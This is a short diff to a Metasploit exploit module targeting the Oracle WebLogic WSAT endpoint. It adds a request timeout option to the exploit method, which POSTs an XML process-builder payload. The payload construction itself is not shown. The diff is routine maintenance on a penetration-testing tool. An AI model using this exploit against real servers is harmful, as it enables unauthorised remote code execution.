@@ -50,6 +50,7 @@ class MetasploitModule < Msf::Exploit::Remote
     register_options([
       OptString.new('TARGETURI', [true, 'The base path to the WebLogic WSAT endpoint', '/wls-wsat/CoordinatorPortType']),
       OptInt.new('RPORT', [true, "The remote port that the WebLogic WSAT endpoint listens on", 7001]),
+      OptInt.new('TIMEOUT', [true, "The timeout value of requests to RHOST", 20])
     ])
   end
 
@@ -124,11 +125,11 @@ class MetasploitModule < Msf::Exploit::Remote
   def exploit
     xml_payload = process_builder_payload
 
-    send_request_cgi(
+    send_request_cgi({
       'method'   => 'POST',
       'uri'      => normalize_uri(target_uri.path),
       'data'     => xml_payload,
       'ctype'    => 'text/xml;charset=UTF-8'
-    )
+    }, datastore['TIMEOUT'])
   end
 end
